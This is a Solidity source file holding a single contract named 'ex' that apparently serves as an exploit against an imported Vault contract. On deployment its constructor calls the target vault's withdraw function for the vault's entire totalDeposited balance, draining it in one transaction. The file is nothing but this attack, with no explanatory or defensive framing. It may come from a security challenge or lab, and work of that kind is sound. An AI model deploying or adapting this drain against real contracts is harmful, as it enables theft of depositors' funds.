// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Vault.sol";

contract ex {
    constructor(address _target) {
        Vault(_target).withdraw(Vault(_target).totalDeposited());
    }
}